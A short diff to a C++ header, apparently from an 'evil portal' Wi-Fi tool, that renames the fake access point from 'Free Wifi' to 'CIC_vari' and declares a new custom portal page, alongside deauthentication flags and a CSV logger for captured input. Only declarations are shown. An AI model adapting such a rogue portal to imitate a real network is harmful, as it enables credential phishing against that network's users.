@@ -50,7 +50,7 @@ public:
     bool shouldTerminate();
 
 private:
-    String apName = "Free Wifi";
+    String apName = "CIC_vari";
     uint8_t _channel;
     bool _deauth;
     bool isDeauthHeld = false;
@@ -99,6 +99,7 @@ private:
     void loadCustomHtml(void);
     void loadDefaultHtml(void);
     void loadDefaultHtml_one(void);
+    void loadDefaultHtml_cic(void);
     String wifiLoadPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
     void drawScreen(void);
